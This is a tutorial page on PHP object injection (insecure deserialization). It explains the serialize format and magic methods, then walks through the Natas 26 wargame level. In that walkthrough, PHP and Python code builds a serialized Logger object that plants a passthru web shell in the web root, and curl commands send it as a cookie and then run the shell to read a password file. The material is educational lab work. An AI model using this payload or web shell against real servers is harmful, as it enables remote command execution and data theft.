# 🌐 Web Security — PHP Object Injection (Deserialization)

> PHP can serialize objects and store them in a cookie.
> If you can control this data, the server creates whatever object you want.

---

## 📋 Table of Contents

- [What Is Serialize / Unserialize?](#what-is-serialize--unserialize)
- [PHP Serialize Format](#php-serialize-format)
- [Magic Methods](#magic-methods)
- [Creating a Malicious Object](#creating-a-malicious-object)
- [Usage in Natas](#usage-in-natas)

---

## What Is Serialize / Unserialize?

**Serialize:** Converting a PHP object or array into a storable/transmittable string.
**Unserialize:** Reconstructing the original object/array from this string.

```php
$data = ["username" => "admin", "role" => "user"];
$str  = serialize($data);
// a:2:{s:8:"username";s:5:"admin";s:4:"role";s:4:"user";}

$back = unserialize($str);
// ["username" => "admin", "role" => "user"]
```

Web applications may use this in a cookie or hidden input.

---

## PHP Serialize Format

```
a:2:{...}           → array, 2 elements
s:5:"admin"         → string, 5 characters, "admin"
i:1                 → integer, 1
b:1                 → boolean, true (0=false, 1=true)
N                   → null
O:4:"User":2:{...}  → Object, class name 4 characters "User", 2 properties
```

### Example Object

```php
class Logger {
    public $filename = "log.txt";
    public $data     = "test";
}

$obj = new Logger();
echo serialize($obj);
// O:6:"Logger":2:{s:8:"filename";s:7:"log.txt";s:4:"data";s:4:"test";}
```

---

## Magic Methods

In PHP, certain special methods are called automatically on specific events:

| Method | When It's Called |
|--------|-------------------|
| `__construct()` | When an object is created |
| `__destruct()` | When an object is destroyed (at the end of the script) |
| `__wakeup()` | After `unserialize()` |
| `__sleep()` | Before `serialize()` |
| `__toString()` | When an object is converted to a string |

### Why Is It Dangerous?

When `unserialize()` is called:
1. The string is parsed, the object is created
2. `__wakeup()` is called automatically
3. At the end of the script, `__destruct()` is called automatically

If these methods perform dangerous operations (writing files, running commands), those operations can be triggered with a malicious serialize string.

---

## Creating a Malicious Object

### Scenario

```php
class Logger {
    private $logFile;
    private $exitMsg;

    public function __destruct() {
        // Write exitMsg to the log file at the end of the script
        file_put_contents($this->logFile, $this->exitMsg);
    }
}
```

`__destruct()` calls `file_put_contents`. If we can control `$logFile` and `$exitMsg`:

```php
$evil = new Logger();
$evil->logFile = "/var/www/html/shell.php";
$evil->exitMsg = "<?php passthru(\$_GET['cmd']); ?>";

echo serialize($evil);
// O:6:"Logger":2:{s:..:"logFile";s:23:"/var/www/html/shell.php";s:..:"exitMsg";s:32:"<?php passthru($_GET['cmd']); ?>";}
```

When this string is `unserialize()`d, shell.php is created at the end of the script.

---

## Usage in Natas

### Natas 26 — RCE with the Logger Class

**Source code (summary):**

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = $file;
    }

    function log($msg) {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $msg."\n");
        fclose($fd);
    }

    function __destruct() {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);   // ← exitMsg is written to the file
        fclose($fd);
    }
}

// Restore the object from the cookie
if(array_key_exists("drawing", $_COOKIE)) {
    $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
}
```

**Exploit Steps:**

**Step 1: Create a malicious Logger object**

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
}

$obj = new Logger();
// Access the private properties via reflection
$obj_ref = new ReflectionClass($obj);

// Or build the serialize string directly:
$payload = 'O:6:"Logger":3:{s:15:"' . "\0Logger\0" . 'logFile";s:27:"/var/www/html/img/shell.php";s:15:"' . "\0Logger\0" . 'initMsg";s:0:"";s:15:"' . "\0Logger\0" . 'exitMsg";s:32:"<?php passthru($_GET[\'cmd\']); ?>";}';

echo base64_encode($payload);
```

The serialize format of private properties: `\0ClassName\0propertyName`

**Creating the payload with Python:**

```python
import base64

# Private property format: \x00ClassName\x00propertyName
log_file = "/var/www/html/img/shell.php"
exit_msg = "<?php passthru($_GET['cmd']); ?>"

payload = (
    'O:6:"Logger":3:{'
    + f's:{len(chr(0) + "Logger" + chr(0) + "logFile")}:"' + chr(0) + 'Logger' + chr(0) + 'logFile";'
    + f's:{len(log_file)}:"{log_file}";'
    + f's:{len(chr(0) + "Logger" + chr(0) + "initMsg")}:"' + chr(0) + 'Logger' + chr(0) + 'initMsg";s:0:"";'
    + f's:{len(chr(0) + "Logger" + chr(0) + "exitMsg")}:"' + chr(0) + 'Logger' + chr(0) + 'exitMsg";'
    + f's:{len(exit_msg)}:"{exit_msg}";'
    + '}'
)

print(base64.b64encode(payload.encode('latin-1')).decode())
```

**Step 2: Send it as a cookie**

```bash
curl -u natas26:[password] \
     -b "drawing=[BASE64_PAYLOAD]" \
     "http://natas26.natas.labs.overthewire.org/"
```

**Step 3: Run the created shell**

```bash
curl -u natas26:[password] \
     "http://natas26.natas.labs.overthewire.org/img/shell.php?cmd=cat+/etc/natas_webpass/natas27"
```

---

### Object Injection — Checklist

```
Detection:
  ☐ Cookie or parameter Base64 → decode → does it start with O:?
  ☐ Is there an unserialize() in the source code?
  ☐ Do __destruct or __wakeup perform a dangerous operation?

Exploit:
  ☐ Copy the class definition from the source code
  ☐ Set the dangerous properties (logFile, exitMsg)
  ☐ Serialize → Base64 encode → send as a cookie
  ☐ Private property: \x00ClassName\x00propertyName
  ☐ Access the uploaded file → run a command
```

---

## 🔗 Resources

- [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP — Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [PHP — serialize()](https://www.php.net/manual/en/function.serialize.php)

---

**Previous topic:** [17_php_type_juggling.md](./17_php_type_juggling.md)
**Next topic:** [19_sql_truncation.md](./19_sql_truncation.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
